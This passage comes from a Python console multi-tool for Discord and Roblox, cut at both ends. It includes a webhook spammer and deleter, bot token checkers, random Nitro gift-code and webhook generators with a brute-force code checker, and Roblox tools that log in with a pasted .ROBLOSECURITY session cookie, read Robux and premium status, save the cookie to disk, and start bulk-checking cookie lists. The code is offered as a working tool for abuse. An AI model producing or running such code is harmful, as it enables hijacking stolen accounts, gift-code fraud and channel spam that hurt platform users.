                print(f"{Colors.GREEN}Username: {Colors.END}{bot.get('username')}#{bot.get('discriminator')}")
                print(f"{Colors.GREEN}ID: {Colors.END}{bot.get('id')}")
                print(f"{Colors.GREEN}Bot: {Colors.END}{bot.get('bot')}")
                
                # Get guilds
                r = requests.get('https://discord.com/api/v9/users/@me/guilds', headers=headers)
                if r.status_code == 200:
                    guilds = r.json()
                    print(f"{Colors.GREEN}Servers: {Colors.END}{len(guilds)}")
                    
                    # Get member counts
                    for guild in guilds[:5]:
                        g = requests.get(f'https://discord.com/api/v9/guilds/{guild["id"]}?with_counts=true', 
                                       headers=headers)
                        if g.status_code == 200:
                            guild_info = g.json()
                            members = guild_info.get('approximate_member_count', 'N/A')
                            print(f"{Colors.GREEN}  - {guild['name']}: {members} members{Colors.END}")
                
                filename = f"bot_info_{bot['id']}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(bot, indent=4))
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid bot token{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def bot_token_checker():
        clear_screen()
        print_section("BOT TOKEN CHECKER")
        
        token = input(f"{Colors.GREEN}[?] Bot Token: {Colors.END}").strip()
        
        headers = {'Authorization': f'Bot {token}'}
        
        try:
            r = requests.get('https://discord.com/api/v9/users/@me', headers=headers)
            
            if r.status_code == 200:
                bot = r.json()
                print(f"\n{Colors.GREEN}[✓] Valid Bot Token!{Colors.END}")
                print(f"{Colors.GREEN}Bot: {Colors.END}{bot.get('username')}#{bot.get('discriminator')}")
                print(f"{Colors.GREEN}ID: {Colors.END}{bot.get('id')}")
            elif r.status_code == 401:
                print(f"{Colors.RED}[!] Invalid Bot Token{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Unknown error (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def permissions_calculator():
        clear_screen()
        print_section("PERMISSIONS CALCULATOR")
        
        permissions = {
            'CREATE_INSTANT_INVITE': 0x1,
            'KICK_MEMBERS': 0x2,
            'BAN_MEMBERS': 0x4,
            'ADMINISTRATOR': 0x8,
            'MANAGE_CHANNELS': 0x10,
            'MANAGE_GUILD': 0x20,
            'ADD_REACTIONS': 0x40,
            'VIEW_AUDIT_LOG': 0x80,
            'PRIORITY_SPEAKER': 0x100,
            'STREAM': 0x200,
            'VIEW_CHANNEL': 0x400,
            'SEND_MESSAGES': 0x800,
            'SEND_TTS_MESSAGES': 0x1000,
            'MANAGE_MESSAGES': 0x2000,
            'EMBED_LINKS': 0x4000,
            'ATTACH_FILES': 0x8000,
            'READ_MESSAGE_HISTORY': 0x10000,
            'MENTION_EVERYONE': 0x20000,
            'USE_EXTERNAL_EMOJIS': 0x40000,
            'CONNECT': 0x100000,
            'SPEAK': 0x200000,
            'MUTE_MEMBERS': 0x400000,
            'DEAFEN_MEMBERS': 0x800000,
            'MOVE_MEMBERS': 0x1000000,
            'USE_VAD': 0x2000000,
            'CHANGE_NICKNAME': 0x4000000,
            'MANAGE_NICKNAMES': 0x8000000,
            'MANAGE_ROLES': 0x10000000,
            'MANAGE_WEBHOOKS': 0x20000000,
            'MANAGE_EMOJIS': 0x40000000
        }
        
        print(f"{Colors.CYAN}[1] Calculate from integer{Colors.END}")
        print(f"{Colors.CYAN}[2] Generate integer from selection{Colors.END}")
        
        mode = input(f"\n{Colors.BLUE}[?] Select mode: {Colors.END}").strip()
        
        if mode == '1':
            try:
                perm_int = int(input(f"{Colors.GREEN}[?] Enter permission integer: {Colors.END}").strip())
                
                print(f"\n{Colors.CYAN}Permissions for {perm_int}:{Colors.END}")
                for name, value in permissions.items():
                    if perm_int & value:
                        print(f"{Colors.GREEN}✓ {name}{Colors.END}")
                    else:
                        print(f"{Colors.RED}✗ {name}{Colors.END}")
            
            except:
                print(f"{Colors.RED}[!] Invalid integer{Colors.END}")
        
        elif mode == '2':
            perms_list = list(permissions.items())
            for i, (name, value) in enumerate(perms_list, 1):
                print(f"{Colors.GREEN}[{i:2}]{Colors.END} {name}")
            
            selected = input(f"\n{Colors.BLUE}[?] Enter numbers (comma separated): {Colors.END}").strip()
            perm_int = 0
            
            for num in selected.split(','):
                try:
                    idx = int(num.strip()) - 1
                    if 0 <= idx < len(perms_list):
                        perm_int += perms_list[idx][1]
                except:
                    pass
            
            print(f"\n{Colors.GREEN}[✓] Permission Integer: {perm_int}{Colors.END}")
            print(f"{Colors.GREEN}[✓] Hex: {Colors.END}{hex(perm_int)}")
        
        press_enter()

# ==================== WEBHOOK TOOLS ====================
class WebhookTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("WEBHOOK TOOLS")
            
            options = {
                '1': 'Webhook Info Checker',
                '2': 'Webhook Deleter',
                '3': 'Webhook Spammer',
                '4': 'Webhook Generator',
                '5': 'Bulk Webhook Checker',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                WebhookTools.webhook_info()
            elif choice == '2':
                WebhookTools.webhook_deleter()
            elif choice == '3':
                WebhookTools.webhook_spammer()
            elif choice == '4':
                WebhookTools.webhook_generator()
            elif choice == '5':
                WebhookTools.bulk_webhook_checker()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def webhook_info():
        clear_screen()
        print_section("WEBHOOK INFO CHECKER")
        
        webhook = input(f"{Colors.GREEN}[?] Webhook URL: {Colors.END}").strip()
        
        try:
            r = requests.get(webhook)
            
            if r.status_code == 200:
                data = r.json()
                
                print(f"\n{Colors.CYAN}═══════════ WEBHOOK INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}ID: {Colors.END}{data.get('id')}")
                print(f"{Colors.GREEN}Name: {Colors.END}{data.get('name')}")
                print(f"{Colors.GREEN}Channel ID: {Colors.END}{data.get('channel_id')}")
                print(f"{Colors.GREEN}Guild ID: {Colors.END}{data.get('guild_id')}")
                print(f"{Colors.GREEN}Token: {Colors.END}{data.get('token')}")
                
                if 'user' in data:
                    print(f"\n{Colors.GREEN}Creator: {Colors.END}{data['user'].get('username')}#{data['user'].get('discriminator')}")
                
                filename = f"webhook_info_{data['id']}.txt"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=4)
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid webhook (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def webhook_deleter():
        clear_screen()
        print_section("WEBHOOK DELETER")
        
        webhook = input(f"{Colors.GREEN}[?] Webhook URL: {Colors.END}").strip()
        
        confirm = input(f"{Colors.RED}[?] Delete this webhook? (yes/no): {Colors.END}").strip()
        
        if confirm.lower() == 'yes':
            try:
                r = requests.delete(webhook)
                
                if r.status_code == 204:
                    print(f"{Colors.GREEN}[✓] Webhook deleted successfully!{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Failed to delete (Status: {r.status_code}){Colors.END}")
            
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def webhook_spammer():
        clear_screen()
        print_section("WEBHOOK SPAMMER")
        
        webhook = input(f"{Colors.GREEN}[?] Webhook URL: {Colors.END}").strip()
        
        try:
            count = int(input(f"{Colors.GREEN}[?] Number of messages: {Colors.END}").strip())
            delay = float(input(f"{Colors.GREEN}[?] Delay (seconds): {Colors.END}").strip())
        except:
            count = 10
            delay = 0.5
        
        message = input(f"{Colors.GREEN}[?] Message: {Colors.END}").strip()
        
        print(f"\n{Colors.CYAN}[*] Starting spam...{Colors.END}")
        
        success = 0
        for i in range(count):
            try:
                data = {'content': f'{message} #{i+1}'}
                r = requests.post(webhook, json=data)
                
                if r.status_code == 204:
                    success += 1
                    print(f"{Colors.GREEN}[✓] Message {i+1}/{count} sent{Colors.END}")
                else:
                    print(f"{Colors.RED}[!] Failed: {r.status_code}{Colors.END}")
                
                time.sleep(delay)
            except Exception as e:
                print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
                break
        
        print(f"\n{Colors.GREEN}[✓] Spam complete! {success}/{count} messages sent{Colors.END}")
        press_enter()
    
    @staticmethod
    def webhook_generator():
        clear_screen()
        print_section("WEBHOOK GENERATOR")
        
        try:
            count = int(input(f"{Colors.GREEN}[?] How many webhooks to generate: {Colors.END}").strip())
        except:
            count = 10
        
        webhooks = []
        for _ in range(count):
            webhook_id = random.randint(10**17, 10**18-1)
            webhook_token = ''.join(random.choices(string.ascii_letters + string.digits + '_-', k=68))
            webhooks.append(f"https://discord.com/api/webhooks/{webhook_id}/{webhook_token}")
        
        filename = f"generated_webhooks_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write('\n'.join(webhooks))
        
        print(f"\n{Colors.GREEN}[✓] Generated {count} webhooks{Colors.END}")
        print(f"{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        
        # Show first 5
        print(f"\n{Colors.CYAN}Sample webhooks:{Colors.END}")
        for webhook in webhooks[:5]:
            print(f"{Colors.GREEN}  {webhook}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def bulk_webhook_checker():
        clear_screen()
        print_section("BULK WEBHOOK CHECKER")
        
        file_path = input(f"{Colors.GREEN}[?] Path to webhook list file: {Colors.END}").strip()
        
        try:
            with open(file_path, 'r') as f:
                webhooks = [line.strip() for line in f if line.strip()]
            
            print(f"{Colors.CYAN}[*] Checking {len(webhooks)} webhooks...{Colors.END}\n")
            
            valid = []
            invalid = []
            
            for i, webhook in enumerate(webhooks, 1):
                print(f"{Colors.CYAN}[*] Checking {i}/{len(webhooks)}{Colors.END}", end='\r')
                
                try:
                    r = requests.get(webhook, timeout=5)
                    
                    if r.status_code == 200:
                        data = r.json()
                        valid.append({
                            'url': webhook,
                            'name': data.get('name'),
                            'id': data.get('id')
                        })
                        print(f"{Colors.GREEN}[✓] Valid: {data.get('name')}{Colors.END}")
                    else:
                        invalid.append(webhook)
                except:
                    invalid.append(webhook)
            
            print(f"\n\n{Colors.GREEN}[✓] Results:{Colors.END}")
            print(f"{Colors.GREEN}  Valid: {len(valid)}{Colors.END}")
            print(f"{Colors.GREEN}  Invalid: {len(invalid)}{Colors.END}")
            
            if valid:
                valid_file = f"valid_webhooks_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(valid_file, 'w') as f:
                    for v in valid:
                        f.write(f"{v['url']}\n")
                
                print(f"{Colors.GREEN}[✓] Valid webhooks saved to {valid_file}{Colors.END}")
            
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()

# ==================== SERVER & NITRO TOOLS ====================
class ServerNitroTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("SERVER & NITRO TOOLS")
            
            options = {
                '1': 'Server Info Grabber',
                '2': 'Invite Info',
                '3': 'Server Booster Stats',
                '4': 'Nitro Code Generator',
                '5': 'Nitro Code Checker',
                '6': 'Gift Code Extractor',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                ServerNitroTools.server_info_grabber()
            elif choice == '2':
                ServerNitroTools.invite_info()
            elif choice == '3':
                ServerNitroTools.server_booster_stats()
            elif choice == '4':
                ServerNitroTools.nitro_code_generator()
            elif choice == '5':
                ServerNitroTools.nitro_code_checker()
            elif choice == '6':
                ServerNitroTools.gift_code_extractor()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def server_info_grabber():
        clear_screen()
        print_section("SERVER INFO GRABBER")
        
        token = input(f"{Colors.GREEN}[?] Discord Token: {Colors.END}").strip()
        guild_id = input(f"{Colors.GREEN}[?] Server ID: {Colors.END}").strip()
        
        headers = {'Authorization': token}
        
        try:
            r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}?with_counts=true', headers=headers)
            
            if r.status_code == 200:
                guild = r.json()
                
                print(f"\n{Colors.CYAN}═══════════ SERVER INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Name: {Colors.END}{guild.get('name')}")
                print(f"{Colors.GREEN}ID: {Colors.END}{guild.get('id')}")
                print(f"{Colors.GREEN}Owner ID: {Colors.END}{guild.get('owner_id')}")
                print(f"{Colors.GREEN}Members: {Colors.END}{guild.get('approximate_member_count', 'N/A')}")
                print(f"{Colors.GREEN}Online: {Colors.END}{guild.get('approximate_presence_count', 'N/A')}")
                print(f"{Colors.GREEN}Boost Level: {Colors.END}{guild.get('premium_tier', 0)}")
                print(f"{Colors.GREEN}Boost Count: {Colors.END}{guild.get('premium_subscription_count', 0)}")
                print(f"{Colors.GREEN}Verification Level: {Colors.END}{guild.get('verification_level')}")
                
                # Get channels
                r2 = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/channels', headers=headers)
                if r2.status_code == 200:
                    channels = r2.json()
                    print(f"{Colors.GREEN}Channels: {Colors.END}{len(channels)}")
                
                # Get roles
                r3 = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/roles', headers=headers)
                if r3.status_code == 200:
                    roles = r3.json()
                    print(f"{Colors.GREEN}Roles: {Colors.END}{len(roles)}")
                
                # Get emojis
                r4 = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}/emojis', headers=headers)
                if r4.status_code == 200:
                    emojis = r4.json()
                    print(f"{Colors.GREEN}Emojis: {Colors.END}{len(emojis)}")
                
                filename = f"server_info_{guild['name']}_{guild['id']}.txt"
                with open(filename, 'w') as f:
                    json.dump(guild, f, indent=4)
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Failed to get server info (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def invite_info():
        clear_screen()
        print_section("INVITE INFO")
        
        invite = input(f"{Colors.GREEN}[?] Invite Code/Link: {Colors.END}").strip()
        
        if 'discord.gg/' in invite:
            invite = invite.split('discord.gg/')[1]
        elif 'discord.com/invite/' in invite:
            invite = invite.split('discord.com/invite/')[1]
        
        try:
            r = requests.get(f'https://discord.com/api/v9/invites/{invite}?with_counts=true')
            
            if r.status_code == 200:
                data = r.json()
                
                print(f"\n{Colors.CYAN}═══════════ INVITE INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Code: {Colors.END}{data.get('code')}")
                print(f"{Colors.GREEN}Uses: {Colors.END}{data.get('uses', 0)}")
                print(f"{Colors.GREEN}Max Uses: {Colors.END}{data.get('max_uses', 'Unlimited')}")
                print(f"{Colors.GREEN}Temporary: {Colors.END}{data.get('temporary', False)}")
                
                if 'guild' in data:
                    guild = data['guild']
                    print(f"\n{Colors.CYAN}═══════════ SERVER INFO ═══════════{Colors.END}")
                    print(f"{Colors.GREEN}Name: {Colors.END}{guild.get('name')}")
                    print(f"{Colors.GREEN}ID: {Colors.END}{guild.get('id')}")
                    print(f"{Colors.GREEN}Members: {Colors.END}{data.get('approximate_member_count', 'N/A')}")
                    print(f"{Colors.GREEN}Online: {Colors.END}{data.get('approximate_presence_count', 'N/A')}")
                
                if 'inviter' in data:
                    inviter = data['inviter']
                    print(f"\n{Colors.GREEN}Inviter: {Colors.END}{inviter.get('username')}#{inviter.get('discriminator')}")
                
                filename = f"invite_info_{invite}.txt"
                with open(filename, 'w') as f:
                    json.dump(data, f, indent=4)
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid invite (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def server_booster_stats():
        clear_screen()
        print_section("SERVER BOOSTER STATS")
        
        token = input(f"{Colors.GREEN}[?] Discord Token: {Colors.END}").strip()
        guild_id = input(f"{Colors.GREEN}[?] Server ID: {Colors.END}").strip()
        
        headers = {'Authorization': token}
        
        try:
            r = requests.get(f'https://discord.com/api/v9/guilds/{guild_id}?with_counts=true', headers=headers)
            
            if r.status_code == 200:
                guild = r.json()
                
                boost_tier = guild.get('premium_tier', 0)
                boost_count = guild.get('premium_subscription_count', 0)
                
                print(f"\n{Colors.CYAN}═══════════ BOOST STATS ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Server: {Colors.END}{guild.get('name')}")
                print(f"{Colors.GREEN}Boost Tier: {Colors.END}{boost_tier}")
                print(f"{Colors.GREEN}Boost Count: {Colors.END}{boost_count}")
                
                # Tier benefits
                print(f"\n{Colors.CYAN}═══════════ TIER BENEFITS ═══════════{Colors.END}")
                if boost_tier >= 1:
                    print(f"{Colors.GREEN}Tier 1: {Colors.END}50 emoji slots, 128kbps audio")
                if boost_tier >= 2:
                    print(f"{Colors.GREEN}Tier 2: {Colors.END}100 emoji slots, 256kbps audio, server banner")
                if boost_tier >= 3:
                    print(f"{Colors.GREEN}Tier 3: {Colors.END}150 emoji slots, 384kbps audio, animated banner")
                
                # Next tier requirements
                if boost_tier < 3:
                    required = {0: 2, 1: 7, 2: 14}[boost_tier]
                    needed = required - boost_count
                    if needed > 0:
                        print(f"\n{Colors.YELLOW}[!] {needed} more boosts needed for Tier {boost_tier + 1}{Colors.END}")
                
            else:
                print(f"{Colors.RED}[!] Failed to get server info (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def nitro_code_generator():
        clear_screen()
        print_section("NITRO CODE GENERATOR")
        
        print(f"{Colors.YELLOW}[!] Note: These are random codes, most will be invalid{Colors.END}")
        
        try:
            count = int(input(f"{Colors.GREEN}[?] How many codes to generate: {Colors.END}").strip())
        except:
            count = 10
        
        codes = []
        for _ in range(count):
            code_length = random.choice([16, 18, 20, 22, 24])
            code = ''.join(random.choices(string.ascii_letters + string.digits, k=code_length))
            codes.append(f"https://discord.gift/{code}")
        
        filename = f"nitro_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(filename, 'w') as f:
            f.write('\n'.join(codes))
        
        print(f"\n{Colors.GREEN}[✓] Generated {count} codes{Colors.END}")
        print(f"{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        
        # Show first 5
        print(f"\n{Colors.CYAN}Sample codes:{Colors.END}")
        for code in codes[:5]:
            print(f"{Colors.GREEN}  {code}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def nitro_code_checker():
        clear_screen()
        print_section("NITRO CODE CHECKER")
        
        source = input(f"{Colors.GREEN}[?] Enter code or path to file: {Colors.END}").strip()
        
        codes = []
        
        if os.path.exists(source):
            with open(source, 'r') as f:
                for line in f:
                    code = line.strip()
                    if 'discord.gift/' in code:
                        code = code.split('discord.gift/')[1]
                    codes.append(code)
        else:
            if 'discord.gift/' in source:
                source = source.split('discord.gift/')[1]
            codes = [source]
        
        print(f"{Colors.CYAN}[*] Checking {len(codes)} codes...{Colors.END}\n")
        
        valid = []
        
        for i, code in enumerate(codes, 1):
            print(f"{Colors.CYAN}[*] Checking {i}/{len(codes)}: {code}{Colors.END}", end='\r')
            
            try:
                r = requests.get(f'https://discord.com/api/v9/entitlements/gift-codes/{code}', timeout=5)
                
                if r.status_code == 200:
                    data = r.json()
                    if not data.get('uses', 0) >= data.get('max_uses', 1):
                        valid.append(f"https://discord.gift/{code}")
                        print(f"{Colors.GREEN}[✓] Valid: {code}{Colors.END}")
                    else:
                        print(f"{Colors.RED}[✗] Used: {code}{Colors.END}")
                else:
                    print(f"{Colors.RED}[✗] Invalid: {code}{Colors.END}")
            except:
                print(f"{Colors.RED}[✗] Error: {code}{Colors.END}")
            
            time.sleep(0.5)
        
        if valid:
            filename = f"valid_nitro_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                f.write('\n'.join(valid))
            
            print(f"\n{Colors.GREEN}[✓] Valid codes saved to {filename}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def gift_code_extractor():
        clear_screen()
        print_section("GIFT CODE EXTRACTOR")
        
        text = input(f"{Colors.GREEN}[?] Enter text containing gift codes: {Colors.END}").strip()
        
        import re
        
        patterns = [
            r'(?:discord\.gift/|discord\.com/gifts/)([a-zA-Z0-9]{16,24})',
            r'([a-zA-Z0-9]{16,24})'
        ]
        
        codes = []
        for pattern in patterns:
            found = re.findall(pattern, text)
            codes.extend(found)
        
        codes = list(set(codes))
        
        if codes:
            print(f"\n{Colors.GREEN}[✓] Found {len(codes)} codes:{Colors.END}")
            for code in codes:
                print(f"{Colors.GREEN}  https://discord.gift/{code}{Colors.END}")
            
            filename = f"extracted_codes_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
            with open(filename, 'w') as f:
                for code in codes:
                    f.write(f"https://discord.gift/{code}\n")
            
            print(f"\n{Colors.GREEN}[✓] Saved to {filename}{Colors.END}")
        else:
            print(f"{Colors.YELLOW}[!] No gift codes found{Colors.END}")
        
        press_enter()

# ==================== ROBLOX TOOLS ====================
class RobloxTools:
    @staticmethod
    def menu():
        while True:
            clear_screen()
            print_section("ROBLOX TOOLS")
            
            options = {
                '1': 'Cookie Login',
                '2': 'Cookie Info',
                '3': 'User Info by ID',
                '4': 'Username to ID',
                '5': 'Cookie Checker Bulk',
                '99': 'Back to Main Menu'
            }
            
            for key, value in options.items():
                print(f"{Colors.GREEN}[{key:>2}]{Colors.END}  {value}")
            
            choice = input(f"\n{Colors.BLUE}[?] Select option ➔ {Colors.END}").strip()
            
            if choice == '99':
                break
            elif choice == '1':
                RobloxTools.cookie_login()
            elif choice == '2':
                RobloxTools.cookie_info()
            elif choice == '3':
                RobloxTools.user_info_by_id()
            elif choice == '4':
                RobloxTools.username_to_id()
            elif choice == '5':
                RobloxTools.cookie_checker_bulk()
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.END}")
                time.sleep(1)
    
    @staticmethod
    def cookie_login():
        clear_screen()
        print_section("COOKIE LOGIN")
        
        cookie = input(f"{Colors.GREEN}[?] Enter .ROBLOSECURITY cookie: {Colors.END}").strip()
        
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
        }
        
        try:
            r = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)
            
            if r.status_code == 200:
                user = r.json()
                
                print(f"\n{Colors.GREEN}[✓] Login successful!{Colors.END}")
                print(f"{Colors.GREEN}Username: {Colors.END}{user.get('name')} ({user.get('displayName')})")
                print(f"{Colors.GREEN}ID: {Colors.END}{user.get('id')}")
                print(f"{Colors.GREEN}Created: {Colors.END}{user.get('created')}")
                
                # Get robux
                r2 = requests.get('https://economy.roblox.com/v1/users/1/currency', headers=headers)
                if r2.status_code == 200:
                    robux = r2.json().get('robux', 0)
                    print(f"{Colors.GREEN}Robux: {Colors.END}{robux}")
                
                # Get premium status
                r3 = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user["id"]}/validate-membership', headers=headers)
                print(f"{Colors.GREEN}Premium: {Colors.END}{'Yes' if r3.status_code == 200 and r3.json() else 'No'}")
                
                filename = f"roblox_cookie_{user['name']}.txt"
                with open(filename, 'w') as f:
                    f.write(cookie)
                
                print(f"\n{Colors.GREEN}[✓] Cookie saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid cookie (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def cookie_info():
        clear_screen()
        print_section("COOKIE INFO")
        
        cookie = input(f"{Colors.GREEN}[?] Enter .ROBLOSECURITY cookie: {Colors.END}").strip()
        
        headers = {
            'Cookie': f'.ROBLOSECURITY={cookie}',
            'User-Agent': 'Mozilla/5.0'
        }
        
        try:
            r = requests.get('https://users.roblox.com/v1/users/authenticated', headers=headers)
            
            if r.status_code == 200:
                user = r.json()
                user_id = user['id']
                
                print(f"\n{Colors.CYAN}═══════════ ACCOUNT INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Username: {Colors.END}{user.get('name')}")
                print(f"{Colors.GREEN}Display Name: {Colors.END}{user.get('displayName')}")
                print(f"{Colors.GREEN}ID: {Colors.END}{user_id}")
                print(f"{Colors.GREEN}Created: {Colors.END}{user.get('created')}")
                
                # Get profile
                r2 = requests.get(f'https://users.roblox.com/v1/users/{user_id}', headers=headers)
                if r2.status_code == 200:
                    profile = r2.json()
                    print(f"{Colors.GREEN}Description: {Colors.END}{profile.get('description', 'None')[:100]}")
                
                # Get robux
                r3 = requests.get('https://economy.roblox.com/v1/users/1/currency', headers=headers)
                if r3.status_code == 200:
                    robux = r3.json().get('robux', 0)
                    print(f"{Colors.GREEN}Robux: {Colors.END}{robux}")
                
                # Get premium
                r4 = requests.get(f'https://premiumfeatures.roblox.com/v1/users/{user_id}/validate-membership', headers=headers)
                print(f"{Colors.GREEN}Premium: {Colors.END}{'Yes' if r4.status_code == 200 and r4.json() else 'No'}")
                
                # Get friends count
                r5 = requests.get(f'https://friends.roblox.com/v1/users/{user_id}/friends/count', headers=headers)
                if r5.status_code == 200:
                    friends = r5.json().get('count', 0)
                    print(f"{Colors.GREEN}Friends: {Colors.END}{friends}")
                
                # Get followers/following
                r6 = requests.get(f'https://friends.roblox.com/v1/users/{user_id}/followers/count', headers=headers)
                if r6.status_code == 200:
                    followers = r6.json().get('count', 0)
                    print(f"{Colors.GREEN}Followers: {Colors.END}{followers}")
                
                r7 = requests.get(f'https://friends.roblox.com/v1/users/{user_id}/followings/count', headers=headers)
                if r7.status_code == 200:
                    following = r7.json().get('count', 0)
                    print(f"{Colors.GREEN}Following: {Colors.END}{following}")
                
                filename = f"roblox_info_{user['name']}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(user, indent=4))
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Invalid cookie (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def user_info_by_id():
        clear_screen()
        print_section("USER INFO BY ID")
        
        user_id = input(f"{Colors.GREEN}[?] Enter Roblox User ID: {Colors.END}").strip()
        
        try:
            r = requests.get(f'https://users.roblox.com/v1/users/{user_id}')
            
            if r.status_code == 200:
                user = r.json()
                
                print(f"\n{Colors.CYAN}═══════════ USER INFO ═══════════{Colors.END}")
                print(f"{Colors.GREEN}Username: {Colors.END}{user.get('name')}")
                print(f"{Colors.GREEN}Display Name: {Colors.END}{user.get('displayName')}")
                print(f"{Colors.GREEN}ID: {Colors.END}{user.get('id')}")
                print(f"{Colors.GREEN}Created: {Colors.END}{user.get('created')}")
                print(f"{Colors.GREEN}Description: {Colors.END}{user.get('description', 'None')[:100]}")
                print(f"{Colors.GREEN}Is Banned: {Colors.END}{user.get('isBanned', False)}")
                
                # Get presence
                r2 = requests.post('https://presence.roblox.com/v1/presence/users', 
                                  json={'userIds': [int(user_id)]})
                if r2.status_code == 200:
                    presence = r2.json().get('userPresences', [{}])[0]
                    status = presence.get('userPresenceType', 0)
                    status_text = ['Offline', 'Online', 'In Game', 'In Studio'][status] if status <= 3 else 'Unknown'
                    print(f"{Colors.GREEN}Status: {Colors.END}{status_text}")
                
                filename = f"roblox_user_{user['name']}_{user_id}.txt"
                with open(filename, 'w') as f:
                    f.write(json.dumps(user, indent=4))
                
                print(f"\n{Colors.GREEN}[✓] Info saved to {filename}{Colors.END}")
            else:
                print(f"{Colors.RED}[!] User not found (Status: {r.status_code}){Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def username_to_id():
        clear_screen()
        print_section("USERNAME TO ID")
        
        username = input(f"{Colors.GREEN}[?] Enter Roblox Username: {Colors.END}").strip()
        
        try:
            r = requests.post('https://users.roblox.com/v1/usernames/users', 
                             json={'usernames': [username], 'excludeBannedUsers': False})
            
            if r.status_code == 200:
                data = r.json()
                if data.get('data'):
                    user = data['data'][0]
                    print(f"\n{Colors.GREEN}[✓] Found:{Colors.END}")
                    print(f"{Colors.GREEN}Username: {Colors.END}{user.get('name')}")
                    print(f"{Colors.GREEN}ID: {Colors.END}{user.get('id')}")
                    print(f"{Colors.GREEN}Display Name: {Colors.END}{user.get('displayName')}")
                else:
                    print(f"{Colors.RED}[!] Username not found{Colors.END}")
            else:
                print(f"{Colors.RED}[!] Error: {r.status_code}{Colors.END}")
        
        except Exception as e:
            print(f"{Colors.RED}[!] Error: {e}{Colors.END}")
        
        press_enter()
    
    @staticmethod
    def cookie_checker_bulk():
        clear_screen()
        print_section("COOKIE CHECKER BULK")
        
        file_path = input(f"{Colors.GREEN}[?] Path to cookie list file: {Colors.END}").strip()
        
        try:
            with open(file_path, 'r') as f:
                cookies = [line.strip() for line in f if line.strip()]
            
